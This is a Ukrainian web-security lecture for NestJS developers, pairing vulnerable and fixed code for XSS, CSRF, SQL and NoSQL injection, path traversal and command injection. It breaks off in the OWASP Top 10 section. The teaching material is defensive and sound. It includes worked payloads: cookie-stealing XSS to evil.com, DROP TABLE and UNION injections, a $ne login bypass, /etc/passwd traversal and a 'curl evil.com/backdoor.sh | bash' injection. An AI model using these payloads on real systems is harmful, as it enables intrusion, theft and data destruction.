# Захист від поширених атак

## Короткий зміст

У цій лекції детально вивчаються найпоширеніші типи атак на веб-застосунки та методи захисту:

- **XSS (Cross-Site Scripting)** — ін'єкція JavaScript коду через користувацький ввід, типи: Reflected XSS, Stored XSS, DOM-based XSS; захист через Content Security Policy, санітизацію HTML, escape спецсимволів, використання textContent замість innerHTML
- **CSRF (Cross-Site Request Forgery)** — виконання небажаних дій від імені автентифікованого користувача, захист через CSRF tokens (synchronizer token pattern), SameSite cookies (Strict/Lax), перевірка Origin/Referer заголовків
- **SQL Injection** — ін'єкція SQL команд через користувацький ввід, приклади атак через WHERE умови, захист через параметризовані запити (prepared statements), ORM best practices (TypeORM автоматично екранує параметри), валідація та санітизація вводу
- **NoSQL Injection** — аналогічні атаки для NoSQL баз (MongoDB), ін'єкція через query operators ($where, $regex), захист через валідацію типів, використання схем валідації, заборона прямого прокидання user input у queries
- **Path Traversal** — несанкціонований доступ до файлів через маніпуляцію шляхами (../../etc/passwd), захист через whitelist дозволених шляхів, валідацію імен файлів, використання path.resolve() та перевірку результату
- **Command Injection** — виконання системних команд через user input, уникнення child_process.exec() з user input, використання spawn() з масивом аргументів, валідація команд через whitelist
- **OWASP Top 10** — огляд найкритичніших вразливостей для backend: Broken Access Control, Cryptographic Failures, Injection, Insecure Design, Security Misconfiguration

Розглядаються практичні приклади атак, демонстрація вразливого та захищеного коду, інструменти для тестування безпеки (OWASP ZAP, Burp Suite), регулярні security audits.

---

::card-group

::card{title="🎯 Мета лекції" icon="i-lucide-target"}

- Опанувати розуміння механізмів найпоширеніших атак на веб-застосунки: XSS, CSRF, SQL Injection, Path Traversal.
- Навчитися розпізнавати вразливий код та застосовувати відповідні патерни захисту.
- Впровадити валідацію та санітизацію користувацького вводу на всіх рівнях застосунку.
- Ознайомитися з OWASP Top 10 як стандартом оцінки безпеки веб-додатків.
- Налаштувати інструменти автоматичного сканування вразливостей у CI/CD pipeline.

::

::card{title="🔑 Ключові терміни" icon="i-lucide-key"}

- **Injection Attack:** впровадження зловмисного коду через некоректно оброблений користувацький ввід.
- **XSS (Cross-Site Scripting):** виконання JavaScript коду у контексті браузера іншого користувача.
- **CSRF (Cross-Site Request Forgery):** виконання небажаних дій від імені автентифікованого користувача без його відома.
- **Escaping (Екранування):** перетворення спецсимволів у безпечні еквіваленти (наприклад, `<` → `&lt;`).
- **Sanitization (Санітизація):** очищення вводу від потенційно небезпечних елементів.
- **Prepared Statements:** параметризовані SQL запити, що запобігають ін'єкціям.

::

::

---

## XSS (Cross-Site Scripting): Ін'єкція JavaScript коду

**Cross-Site Scripting (XSS)** — це атака, при якій зловмисник впроваджує зловмисний JavaScript код на легітимну сторінку через некоректно оброблений користувацький ввід. Код виконується у браузері жертви у контексті довіреного сайту, що дозволяє зловмисникові красти cookies, токени автентифікації, виконувати дії від імені користувача або перенаправляти на фішингові сайти.

### Типи XSS атак

#### 1. Reflected XSS (Відбитий XSS)

Зловмисний код передається через URL параметри та відразу виконується у відповіді сервера.

**Приклад вразливого коду:**

```typescript
// ❌ НЕБЕЗПЕЧНО: пряме виведення query параметра без екранування
@Controller('search')
export class SearchController {
  @Get()
  search(@Query('q') query: string, @Res() res: Response) {
    // Якщо query = "<script>alert('XSS')</script>"
    res.send(`<h1>Результати пошуку: ${query}</h1>`);
    // HTML виконається у браузері!
  }
}
```

**Атака:**

```
GET /search?q=<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>
```

Зловмисник надсилає жертві URL з вбудованим script. При відкритті URL, script виконується та викрадає cookies користувача.

#### 2. Stored XSS (Збережений XSS)

Зловмисний код зберігається у базі даних (наприклад, у коментарі або пості) та виконується у всіх користувачів, які переглядають цей контент.

**Приклад вразливого коду:**

```typescript
// ❌ НЕБЕЗПЕЧНО: збереження та виведення HTML без санітизації
@Controller('comments')
export class CommentsController {
  @Post()
  async createComment(@Body() dto: CreateCommentDto) {
    // Зберігаємо як є (навіть якщо містить <script>)
    const comment = await this.commentsService.create(dto);
    return comment;
  }

  @Get()
  async getComments(@Res() res: Response) {
    const comments = await this.commentsService.findAll();
    
    // Виводимо без екранування
    const html = comments
      .map(c => `<div>${c.text}</div>`)
      .join('');
    
    res.send(html);
  }
}
```

**Атака:**

Зловмисник створює коментар:

```
POST /comments
{
  "text": "<img src=x onerror='fetch(\"https://evil.com?cookie=\"+document.cookie)'>"
}
```

Тепер **кожен користувач**, який переглядає коментарі, виконує цей script.

#### 3. DOM-based XSS (XSS на основі DOM)

Вразливість у клієнтському JavaScript коді, що маніпулює DOM на основі user input.

**Приклад вразливого frontend коду:**

```typescript
// ❌ НЕБЕЗПЕЧНО: використання innerHTML з user input
function displayMessage(message: string) {
  const container = document.getElementById('message');
  container.innerHTML = message; // Виконається будь-який HTML/script
}

// URL: /app#<img src=x onerror=alert('XSS')>
const userInput = window.location.hash.substring(1);
displayMessage(userInput);
```

### Захист від XSS

#### 1. Content Security Policy (CSP)

Про CSP ми детально розглядали у лекції про Helmet Security Headers. CSP **блокує виконання inline scripts** та обмежує джерела завантаження:

```typescript
// src/main.ts
import helmet from 'helmet';

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      defaultSrc: ["'self'"],
      scriptSrc: ["'self'", "https://trusted-cdn.com"], // Заборона inline scripts
      styleSrc: ["'self'", "'unsafe-inline'"],
      objectSrc: ["'none'"],
    },
  })
);
```

**Результат:** навіть якщо зловмисник впровадить `<script>alert('XSS')</script>`, браузер **не виконає** цей код.

#### 2. Екранування HTML спецсимволів

Перетворення небезпечних символів у безпечні HTML entities:

```typescript
// src/common/utils/escape-html.util.ts
export function escapeHtml(text: string): string {
  const map: Record<string, string> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;',
  };
  
  return text.replace(/[&<>"'/]/g, (char) => map[char]);
}
```

**Використання:**

```typescript
// ✅ БЕЗПЕЧНО: екранування перед виведенням
@Get('search')
search(@Query('q') query: string, @Res() res: Response) {
  const safeQuery = escapeHtml(query);
  res.send(`<h1>Результати пошуку: ${safeQuery}</h1>`);
}
```

**Результат:**

```
Input:  <script>alert('XSS')</script>
Output: &lt;script&gt;alert(&#x27;XSS&#x27;)&lt;&#x2F;script&gt;
Браузер відображає: <script>alert('XSS')</script> (як текст, не виконує)
```

#### 3. Санітизація HTML через бібліотеки

Для випадків, коли потрібно дозволити **безпечний HTML** (наприклад, форматування тексту), використовуйте санітизатори:

```bash
npm install dompurify
npm install @types/dompurify --save-dev
```

```typescript
// src/common/utils/sanitize-html.util.ts
import DOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = DOMPurify(window as any);

export function sanitizeHtml(dirty: string): string {
  return purify.sanitize(dirty, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p', 'br'],
    ALLOWED_ATTR: ['href'],
  });
}
```

**Використання:**

```typescript
@Post('comments')
async createComment(@Body() dto: CreateCommentDto) {
  const sanitized = sanitizeHtml(dto.text);
  return this.commentsService.create({ ...dto, text: sanitized });
}
```

**Результат:**

```
Input:  <p>Hello <script>alert('XSS')</script> World</p>
Output: <p>Hello  World</p> (script видалено)
```

#### 4. Використання textContent замість innerHTML (Frontend)

```typescript
// ❌ НЕБЕЗПЕЧНО
element.innerHTML = userInput;

// ✅ БЕЗПЕЧНО: вставляє як текст, не інтерпретує HTML
element.textContent = userInput;
```

#### 5. Валідація типів даних

```typescript
// src/comments/dto/create-comment.dto.ts
import { IsString, MaxLength, Matches } from 'class-validator';

export class CreateCommentDto {
  @IsString()
  @MaxLength(500)
  @Matches(/^[^<>]*$/, { message: 'HTML теги заборонені' }) // Блокувати < та >
  text: string;
}
```

::warning
**Увага:** валідація на стороні клієнта **не є захистом**! Зловмисник може обійти frontend валідацію через DevTools або прямі HTTP запити. Завжди валідуйте на backend.
::

---

## CSRF (Cross-Site Request Forgery): Підробка запитів

**Cross-Site Request Forgery (CSRF)** — це атака, при якій зловмисник змушує браузер жертви виконати небажану дію на довіреному сайті, де користувач автентифікований.

### Механізм CSRF атаки

**Сценарій:**

1. Користувач автентифікований на `bank.com` (session cookie збережено у браузері).
2. Користувач відкриває зловмисний сайт `evil.com`.
3. Зловмисний сайт містить прихований HTML:

```html
<!-- evil.com -->
<form action="https://bank.com/transfer" method="POST" id="csrf-form">
  <input type="hidden" name="to" value="attacker_account" />
  <input type="hidden" name="amount" value="10000" />
</form>

<script>
  document.getElementById('csrf-form').submit();
</script>
```

4. Браузер **автоматично додає session cookie** до запиту на `bank.com`.
5. Банківський сервер бачить валідну сесію та виконує переказ.

**Жертва навіть не помітила атаки!**

### Захист від CSRF

#### 1. CSRF Tokens (Synchronizer Token Pattern)

**Принцип:** сервер генерує унікальний токен для кожної сесії/форми, який додається до форми як прихований input. При відправці форми сервер перевіряє, чи токен валідний.

**Встановлення `csurf` (для Express/NestJS):**

```bash
npm install csurf
npm install @types/csurf --save-dev
```

**Налаштування у NestJS:**

```typescript
// src/main.ts
import * as csurf from 'csurf';
import * as cookieParser from 'cookie-parser';

async function bootstrap() {
  const app = await NestFactory.create(AppModule);

  app.use(cookieParser());
  app.use(csurf({ cookie: true })); // CSRF tokens у cookies

  await app.listen(3000);
}
```

**Додавання токену до форми (SSR):**

```html
<!-- views/transfer.ejs -->
<form action="/transfer" method="POST">
  <input type="hidden" name="_csrf" value="<%= csrfToken %>" />
  <input type="text" name="to" placeholder="Одержувач" />
  <input type="number" name="amount" placeholder="Сума" />
  <button type="submit">Перевести</button>
</form>
```

**Валідація токену на backend:**

```typescript
// CSRF middleware автоматично валідує токен
// Якщо токен невалідний → 403 Forbidden
@Post('transfer')
async transfer(@Body() dto: TransferDto) {
  // Цей код виконається лише якщо CSRF токен валідний
  return this.bankService.transfer(dto);
}
```

**Чому це працює:** зловмисний сайт `evil.com` **не може отримати** CSRF токен з `bank.com` через Same-Origin Policy браузера.

#### 2. SameSite Cookies

**SameSite** — це атрибут cookie, що обмежує відправлення cookies у cross-site запитах.

```typescript
// src/auth/auth.service.ts
@Injectable()
export class AuthService {
  async login(res: Response, user: User) {
    const token = this.generateJwt(user);

    res.cookie('session', token, {
      httpOnly: true,
      secure: true,          // Лише HTTPS
      sameSite: 'strict',    // ❗ Ключовий параметр
      maxAge: 3600000,       // 1 година
    });

    return { message: 'Logged in successfully' };
  }
}
```

**Значення SameSite:**

| Значення | Опис | Захист від CSRF |
|----------|------|-----------------|
| `Strict` | Cookie **не** відправляється у cross-site запитах | ✅ Повний захист |
| `Lax` | Cookie відправляється лише для безпечних методів (GET) з топ-level navigation | ⚠️ Частковий захист |
| `None` | Cookie завжди відправляється (потрібен `Secure`) | ❌ Немає захисту |

**Рекомендація:** використовуйте `SameSite=Strict` для session cookies.

::note
**SameSite=Strict може порушити UX:** якщо користувач переходить на ваш сайт з зовнішнього джерела (наприклад, email посилання), він буде вважатися неавтентифікованим до першого GET запиту. Для таких випадків використовуйте `SameSite=Lax`.
::

#### 3. Перевірка Origin та Referer заголовків

```typescript
// src/common/guards/csrf-origin.guard.ts
import { Injectable, CanActivate, ExecutionContext, ForbiddenException } from '@nestjs/common';

@Injectable()
export class CsrfOriginGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const request = context.switchToHttp().getRequest();
    const allowedOrigins = ['https://example.com', 'https://app.example.com'];

    const origin = request.get('origin') || request.get('referer');

    if (!origin) {
      // Немає Origin/Referer — можливо пряме API звернення
      return true;
    }

    const originUrl = new URL(origin);
    if (!allowedOrigins.includes(originUrl.origin)) {
      throw new ForbiddenException('Invalid origin');
    }

    return true;
  }
}
```

**Застосування до маршрутів, що змінюють дані:**

```typescript
@Controller('bank')
export class BankController {
  @Post('transfer')
  @UseGuards(CsrfOriginGuard)
  async transfer(@Body() dto: TransferDto) {
    return this.bankService.transfer(dto);
  }
}
```

#### 4. Вимога custom headers для API

API запити з JavaScript можуть включати custom headers, які cross-site форми не можуть додати:

```typescript
// Frontend
const response = await fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-Requested-With': 'XMLHttpRequest', // Custom header
  },
  body: JSON.stringify({ to: 'account', amount: 100 }),
});
```

**Backend перевірка:**

```typescript
@Injectable()
export class ApiHeaderGuard implements CanActivate {
  canActivate(context: ExecutionContext): boolean {
    const request = context.switchToHttp().getRequest();
    const header = request.get('X-Requested-With');

    if (header !== 'XMLHttpRequest') {
      throw new ForbiddenException('Missing required header');
    }

    return true;
  }
}
```

**Чому це працює:** HTML форми **не можуть** додавати custom headers. Лише JavaScript fetch/axios можуть це зробити, але через CORS їм потрібен дозвіл від сервера (який зловмисний сайт не отримає).




---

## SQL Injection: Ін'єкція SQL команд

**SQL Injection** — це атака, при якій зловмисник впроваджує зловмисний SQL код через user input для маніпуляції запитами до бази даних. Це одна з найнебезпечніших вразливостей, що дозволяє зчитувати, змінювати або видаляти дані, обходити автентифікацію та навіть виконувати системні команди на сервері БД.

### Приклад класичної SQL Injection атаки

**Вразливий код:**

```typescript
// ❌ НЕБЕЗПЕЧНО: конкатенація user input у SQL запит
@Get('users/:email')
async getUserByEmail(@Param('email') email: string) {
  const query = `SELECT * FROM users WHERE email = '${email}'`;
  const user = await this.dataSource.query(query);
  return user;
}
```

**Нормальне використання:**

```
GET /users/john@example.com

SQL: SELECT * FROM users WHERE email = 'john@example.com'
Результат: повертає користувача John
```

**Атака:**

```
GET /users/' OR '1'='1

SQL: SELECT * FROM users WHERE email = '' OR '1'='1'
Результат: повертає ВСІ користувачі (бо '1'='1' завжди true)
```

**Атака для витягування паролів:**

```
GET /users/' UNION SELECT password FROM users WHERE email='admin@example.com

SQL: SELECT * FROM users WHERE email = '' UNION SELECT password FROM users WHERE email='admin@example.com'
Результат: витягує пароль адміністратора
```

**Атака для видалення даних:**

```
GET /users/'; DROP TABLE users; --

SQL: SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
Результат: видаляє таблицю users!
```

### Захист від SQL Injection

#### 1. Параметризовані запити (Prepared Statements)

**Безпечний код з TypeORM:**

```typescript
// ✅ БЕЗПЕЧНО: параметризований запит
@Get('users/:email')
async getUserByEmail(@Param('email') email: string) {
  const user = await this.dataSource
    .getRepository(User)
    .createQueryBuilder('user')
    .where('user.email = :email', { email }) // Параметр :email
    .getOne();
  
  return user;
}
```

**Що відбувається під капотом:**

TypeORM передає параметри **окремо** від SQL запиту:

```sql
-- Запит
SELECT * FROM users WHERE email = ?

-- Параметри (передаються окремо)
['john@example.com']
```

База даних **ніколи не інтерпретує параметри як SQL код** — вони завжди трактуються як дані.

**Спроба атаки:**

```
GET /users/' OR '1'='1

SQL: SELECT * FROM users WHERE email = ?
Параметри: ["' OR '1'='1"]

Результат: шукає користувача з email = "' OR '1'='1" (не знаходить)
```

#### 2. ORM методи замість сирого SQL

```typescript
// ✅ БЕЗПЕЧНО: використання ORM методів
@Get('users')
async getUsers(@Query('role') role: string) {
  // TypeORM автоматично екранує параметри
  return this.userRepository.find({
    where: { role },
  });
}

// ✅ БЕЗПЕЧНО: Query Builder з параметрами
@Get('posts')
async getPosts(@Query('authorId') authorId: string, @Query('status') status: string) {
  return this.postRepository
    .createQueryBuilder('post')
    .where('post.authorId = :authorId', { authorId })
    .andWhere('post.status = :status', { status })
    .getMany();
}
```

#### 3. Валідація та санітизація вводу

```typescript
// src/users/dto/search-user.dto.ts
import { IsEmail, IsOptional, IsIn } from 'class-validator';

export class SearchUserDto {
  @IsEmail()
  email: string;

  @IsOptional()
  @IsIn(['active', 'inactive', 'banned']) // Whitelist дозволених значень
  status?: string;
}
```

**Використання:**

```typescript
@Get('users/search')
async searchUsers(@Query() dto: SearchUserDto) {
  // dto.email та dto.status вже провалідовані
  return this.userRepository.find({
    where: {
      email: dto.email,
      status: dto.status,
    },
  });
}
```

#### 4. Обмеження прав доступу до БД

**Принцип найменших привілеїв:** застосунок повинен підключатися до БД з обліковим записом, що має **мінімальні необхідні права**.

**PostgreSQL приклад:**

```sql
-- Створити окремого користувача для застосунку
CREATE USER app_user WITH PASSWORD 'secure_password';

-- Надати права ЛИШЕ на необхідні таблиці
GRANT SELECT, INSERT, UPDATE, DELETE ON users, posts, comments TO app_user;

-- Заборонити DROP, CREATE, ALTER
REVOKE CREATE, DROP, ALTER ON ALL TABLES IN SCHEMA public FROM app_user;
```

**Результат:** навіть якщо зловмисник впровадить `DROP TABLE users`, БД відхилить запит через відсутність прав.

#### 5. Логування та моніторинг підозрілих запитів

```typescript
// src/common/interceptors/sql-logging.interceptor.ts
import { Injectable, NestInterceptor, ExecutionContext, CallHandler, Logger } from '@nestjs/common';
import { Observable } from 'rxjs';
import { tap, catchError } from 'rxjs/operators';

@Injectable()
export class SqlLoggingInterceptor implements NestInterceptor {
  private logger = new Logger('SQL');

  intercept(context: ExecutionContext, next: CallHandler): Observable<any> {
    const request = context.switchToHttp().getRequest();

    return next.handle().pipe(
      catchError((error) => {
        // Логувати SQL помилки (можливі спроби ін'єкції)
        if (error.message.includes('syntax error') || error.message.includes('SQL')) {
          this.logger.error(
            `Possible SQL Injection attempt: ${request.url} | ` +
            `Query: ${JSON.stringify(request.query)} | ` +
            `Body: ${JSON.stringify(request.body)}`
          );
        }
        throw error;
      })
    );
  }
}
```

---

## NoSQL Injection: Атаки на MongoDB

NoSQL бази даних (MongoDB, CouchDB) також вразливі до ін'єкцій, хоча механізм відрізняється від SQL.

### Приклад NoSQL Injection через query operators

**Вразливий код:**

```typescript
// ❌ НЕБЕЗПЕЧНО: прямий прокидання user input у query
@Post('login')
async login(@Body() credentials: any) {
  const user = await this.userModel.findOne({
    email: credentials.email,
    password: credentials.password,
  });

  if (user) {
    return { token: this.generateToken(user) };
  }

  throw new UnauthorizedException('Invalid credentials');
}
```

**Атака:**

```json
POST /login
{
  "email": "admin@example.com",
  "password": { "$ne": null }
}
```

**Що відбувається:**

```javascript
// MongoDB query
db.users.findOne({
  email: "admin@example.com",
  password: { $ne: null }  // $ne = not equal (не дорівнює)
})

// Результат: знаходить admin, бо його пароль != null (завжди true)
```

Зловмисник обходить перевірку паролю!

### Захист від NoSQL Injection

#### 1. Валідація типів даних

```typescript
// src/auth/dto/login.dto.ts
import { IsEmail, IsString, MinLength } from 'class-validator';

export class LoginDto {
  @IsEmail()
  email: string;

  @IsString() // ❗ Важливо: гарантуємо, що це string, а не object
  @MinLength(6)
  password: string;
}
```

**Використання:**

```typescript
@Post('login')
async login(@Body() dto: LoginDto) {
  // dto.password ГАРАНТОВАНО string, не може бути { $ne: null }
  const user = await this.userModel.findOne({
    email: dto.email,
    password: dto.password, // Безпечно
  });

  if (!user) {
    throw new UnauthorizedException('Invalid credentials');
  }

  return { token: this.generateToken(user) };
}
```

#### 2. Санітизація MongoDB операторів

```typescript
// src/common/utils/sanitize-mongodb.util.ts
export function sanitizeMongoQuery(obj: any): any {
  if (typeof obj !== 'object' || obj === null) {
    return obj;
  }

  const sanitized: any = Array.isArray(obj) ? [] : {};

  for (const key in obj) {
    // Видалити всі ключі, що починаються з $ (MongoDB операторі)
    if (key.startsWith('$')) {
      continue;
    }

    sanitized[key] = sanitizeMongoQuery(obj[key]);
  }

  return sanitized;
}
```

**Використання:**

```typescript
@Post('search')
async search(@Body() query: any) {
  const sanitized = sanitizeMongoQuery(query);
  return this.userModel.find(sanitized);
}
```

**Спроба атаки:**

```json
POST /search
{
  "email": "admin@example.com",
  "password": { "$ne": null }
}

// Після санітизації
{
  "email": "admin@example.com",
  "password": {}  // $ne видалено
}
```

#### 3. Mongoose схеми з strong typing

```typescript
// src/users/schemas/user.schema.ts
import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';
import { Document } from 'mongoose';

@Schema()
export class User extends Document {
  @Prop({ required: true, type: String }) // Явна вказівка типу
  email: string;

  @Prop({ required: true, type: String })
  password: string;

  @Prop({ type: String, enum: ['user', 'admin'] })
  role: string;
}

export const UserSchema = SchemaFactory.createForClass(User);
```

Mongoose автоматично відхилить дані, що не відповідають схемі.

---

## Path Traversal: Несанкціонований доступ до файлів

**Path Traversal** (також Directory Traversal) — це атака, при якій зловмисник маніпулює шляхами до файлів для доступу до файлів поза дозволеною директорією.

### Приклад Path Traversal атаки

**Вразливий код:**

```typescript
// ❌ НЕБЕЗПЕЧНО: використання user input для побудови шляху
@Get('files/:filename')
async getFile(@Param('filename') filename: string, @Res() res: Response) {
  const filePath = `./uploads/${filename}`;
  res.sendFile(filePath, { root: __dirname });
}
```

**Нормальне використання:**

```
GET /files/report.pdf

Шлях: ./uploads/report.pdf
Результат: повертає report.pdf
```

**Атака:**

```
GET /files/../../etc/passwd

Шлях: ./uploads/../../etc/passwd
Реальний шлях: /etc/passwd
Результат: витягує системний файл з паролями!
```

**Атака для доступу до .env файлу:**

```
GET /files/../../.env

Результат: витягує конфігурацію з credentials до БД, API ключами тощо
```

### Захист від Path Traversal

#### 1. Whitelist дозволених файлів

```typescript
// ✅ БЕЗПЕЧНО: дозволяємо лише файли з певного списку
const ALLOWED_FILES = new Set(['report.pdf', 'invoice.pdf', 'contract.pdf']);

@Get('files/:filename')
async getFile(@Param('filename') filename: string, @Res() res: Response) {
  if (!ALLOWED_FILES.has(filename)) {
    throw new NotFoundException('File not found');
  }

  const filePath = path.join(__dirname, 'uploads', filename);
  res.sendFile(filePath);
}
```

#### 2. Валідація імені файлу

```typescript
// src/files/dto/get-file.dto.ts
import { IsString, Matches } from 'class-validator';

export class GetFileDto {
  @IsString()
  @Matches(/^[a-zA-Z0-9_\-\.]+$/, { 
    message: 'Ім\'я файлу може містити лише літери, цифри, дефіси, підкреслення та крапки' 
  })
  filename: string;
}
```

**Результат:**

```
Дозволено: report.pdf, invoice_2024.pdf, contract-v2.docx
Заборонено: ../secret.txt, ../../etc/passwd, file with spaces.pdf
```

#### 3. Використання path.resolve() з перевіркою

```typescript
// ✅ БЕЗПЕЧНО: нормалізація шляху та перевірка
import * as path from 'path';

@Get('files/:filename')
async getFile(@Param('filename') filename: string, @Res() res: Response) {
  const uploadsDir = path.resolve(__dirname, 'uploads');
  const requestedPath = path.resolve(uploadsDir, filename);

  // Перевірка: чи знаходиться файл всередині uploads директорії?
  if (!requestedPath.startsWith(uploadsDir)) {
    throw new ForbiddenException('Access denied');
  }

  // Перевірка існування файлу
  if (!fs.existsSync(requestedPath)) {
    throw new NotFoundException('File not found');
  }

  res.sendFile(requestedPath);
}
```

**Що відбувається:**

```typescript
uploadsDir = /app/uploads
filename = ../../etc/passwd

requestedPath = path.resolve(/app/uploads, ../../etc/passwd)
              = /etc/passwd

requestedPath.startsWith(uploadsDir) → false
→ Доступ заборонено!
```

#### 4. Використання UUID для імен файлів

```typescript
// src/files/files.service.ts
import { v4 as uuidv4 } from 'uuid';

@Injectable()
export class FilesService {
  async uploadFile(file: Express.Multer.File) {
    // Генерувати унікальне ім'я файлу (уникаємо user input)
    const extension = path.extname(file.originalname);
    const filename = `${uuidv4()}${extension}`;
    const filepath = path.join('./uploads', filename);

    await fs.promises.writeFile(filepath, file.buffer);

    return { filename };
  }

  async getFile(filename: string) {
    // filename = "a3f2e8d5-9c4b-4f3a-8e2d-1a2b3c4d5e6f.pdf" (не містить ..)
    const filepath = path.join('./uploads', filename);
    
    if (!fs.existsSync(filepath)) {
      throw new NotFoundException('File not found');
    }

    return filepath;
  }
}
```

**Перевага:** користувач ніколи не контролює імена файлів → атака неможлива.

---

## Command Injection: Виконання системних команд

**Command Injection** — це атака, при якій зловмисник впроваджує системні команди через user input для виконання на сервері.

### Приклад Command Injection атаки

**Вразливий код:**

```typescript
// ❌ НЕБЕЗПЕЧНО: використання user input у системних командах
import { exec } from 'child_process';

@Get('ping/:host')
async ping(@Param('host') host: string) {
  return new Promise((resolve, reject) => {
    exec(`ping -c 4 ${host}`, (error, stdout, stderr) => {
      if (error) {
        reject(error);
      }
      resolve({ output: stdout });
    });
  });
}
```

**Нормальне використання:**

```
GET /ping/google.com

Команда: ping -c 4 google.com
Результат: PING google.com ...
```

**Атака:**

```
GET /ping/google.com; cat /etc/passwd

Команда: ping -c 4 google.com; cat /etc/passwd
Результат: виконує обидві команди — ping + виводить /etc/passwd
```

**Атака для backdoor:**

```
GET /ping/google.com; curl https://evil.com/backdoor.sh | bash

Результат: завантажує та виконує зловмисний script
```

### Захист від Command Injection

#### 1. Уникати child_process.exec() з user input

```typescript
// ❌ НЕБЕЗПЕЧНО
import { exec } from 'child_process';
exec(`command ${userInput}`);

// ✅ БЕЗПЕЧНО: використання spawn() з масивом аргументів
import { spawn } from 'child_process';

@Get('ping/:host')
async ping(@Param('host') host: string) {
  // Валідація: дозволити лише домени/IP
  if (!/^[a-zA-Z0-9\.\-]+$/.test(host)) {
    throw new BadRequestException('Invalid host');
  }

  return new Promise((resolve, reject) => {
    const process = spawn('ping', ['-c', '4', host]); // Аргументи передаються як масив

    let output = '';
    process.stdout.on('data', (data) => {
      output += data.toString();
    });

    process.on('close', (code) => {
      if (code !== 0) {
        reject(new Error(`ping exited with code ${code}`));
      }
      resolve({ output });
    });
  });
}
```

**Чому це безпечно:** `spawn()` передає аргументи **напряму до процесу**, не через shell. Спецсимволи (`; & | > <`) не інтерпретуються як команди.

#### 2. Whitelist дозволених команд

```typescript
const ALLOWED_COMMANDS = new Map([
  ['ping', '/usr/bin/ping'],
  ['traceroute', '/usr/bin/traceroute'],
]);

@Get('network/:command/:host')
async executeNetworkCommand(
  @Param('command') command: string,
  @Param('host') host: string
) {
  if (!ALLOWED_COMMANDS.has(command)) {
    throw new BadRequestException('Command not allowed');
  }

  if (!/^[a-zA-Z0-9\.\-]+$/.test(host)) {
    throw new BadRequestException('Invalid host');
  }

  const execPath = ALLOWED_COMMANDS.get(command);
  const process = spawn(execPath, ['-c', '4', host]);

  // ... обробка виводу
}
```

#### 3. Використання бібліотек замість shell команд

```typescript
// ❌ НЕБЕЗПЕЧНО: виклик системної команди
exec(`convert ${userFile} -resize 200x200 ${outputFile}`);

// ✅ БЕЗПЕЧНО: використання JavaScript бібліотеки
import sharp from 'sharp';

await sharp(userFile)
  .resize(200, 200)
  .toFile(outputFile);
```

**Переваги:**
- Немає Command Injection (взагалі не використовується shell)
- Кросплатформенність (працює на Linux, Windows, macOS)
- Краща продуктивність (без overhead запуску процесу)



---

## OWASP Top 10: Найкритичніші вразливості

**OWASP (Open Web Application Security Project)** — це некомерційна організація, що публікує стандарти та інструменти для безпеки веб-застосунків. **OWASP Top 10** — це рейтинг найнебезпечніших вразливостей, оновлюваний кожні 3-4 роки.

### OWASP Top 10 (2021)

#### A01: Broken Access Control

**Опис:** порушення контролю доступу дозволяє користувачам виконувати дії поза їхніми дозволами.

**Приклади:**

- Доступ до чужого профілю через URL: `/users/123/profile` → змінити на `/users/124/profile`
- Підвищення привілеїв: звичайний користувач може виконувати адміністративні дії
- Обхід авторизації через пряме посилання на API endpoint

**Захист:**

```typescript
// ✅ Перевірка прав доступу
@Get('users/:id/profile')
@UseGuards(JwtAuthGuard)
async getProfile(@Param('id') id: string, @CurrentUser() user: User) {
  // Користувач може переглядати лише свій профіль
  if (user.id !== id && user.role !== 'admin') {
    throw new ForbiddenException('Access denied');
  }

  return this.userService.getProfile(id);
}
```

#### A02: Cryptographic Failures

**Опис:** неправильне використання криптографії — зберігання паролів у відкритому вигляді, слабкі алгоритми хешування, відсутність шифрування конфіденційних даних.

**Приклади:**

- Зберігання паролів без хешування
- Використання MD5/SHA1 для паролів (застарілі та вразливі)
- Передача конфіденційних даних через HTTP (без TLS)

**Захист:**

```typescript
// ✅ Хешування паролів через bcrypt
import * as bcrypt from 'bcrypt';

@Injectable()
export class AuthService {
  async hashPassword(password: string): Promise<string> {
    const salt = await bcrypt.genSalt(12); // 12 rounds — оптимальний баланс
    return bcrypt.hash(password, salt);
  }

  async validatePassword(password: string, hash: string): Promise<boolean> {
    return bcrypt.compare(password, hash);
  }
}
```

**Шифрування конфіденційних даних:**

```typescript
// src/common/utils/encryption.util.ts
import * as crypto from 'crypto';

const ALGORITHM = 'aes-256-gcm';
const SECRET_KEY = process.env.ENCRYPTION_KEY; // 32 bytes

export function encrypt(text: string): { encrypted: string; iv: string; tag: string } {
  const iv = crypto.randomBytes(16);
  const cipher = crypto.createCipheriv(ALGORITHM, Buffer.from(SECRET_KEY), iv);

  let encrypted = cipher.update(text, 'utf8', 'hex');
  encrypted += cipher.final('hex');

  const tag = cipher.getAuthTag();

  return {
    encrypted,
    iv: iv.toString('hex'),
    tag: tag.toString('hex'),
  };
}

export function decrypt(encrypted: string, iv: string, tag: string): string {
  const decipher = crypto.createDecipheriv(
    ALGORITHM,
    Buffer.from(SECRET_KEY),
    Buffer.from(iv, 'hex')
  );

  decipher.setAuthTag(Buffer.from(tag, 'hex'));

  let decrypted = decipher.update(encrypted, 'hex', 'utf8');
  decrypted += decipher.final('utf8');

  return decrypted;
}
```

#### A03: Injection

**Опис:** ін'єкції (SQL, NoSQL, OS Command, LDAP) через некоректну обробку user input.

**Захист:** детально розглянуто вище (параметризовані запити, валідація, санітизація).

#### A04: Insecure Design

**Опис:** фундаментальні недоліки у проєктуванні системи безпеки, що не можна виправити просто додаванням заходів.

**Приклади:**

- Відсутність rate limiting для критичних операцій (розглянуто у попередній лекції)
- Відсутність multi-factor authentication для адміністраторів
- Недостатнє логування безпеки (неможливо виявити атаку)

**Захист:**

- **Threat Modeling** на етапі проєктування: аналіз потенційних атак та вразливостей
- **Security by Design:** безпека як частина архітектури, а не afterthought
- **Defense in Depth:** кілька рівнів захисту (якщо один провалиться, інші утримають)

#### A05: Security Misconfiguration

**Опис:** неправильна конфігурація серверів, баз даних, фреймворків.

**Приклади:**

- Залишені debug режими у продакшені (`NODE_ENV=development`)
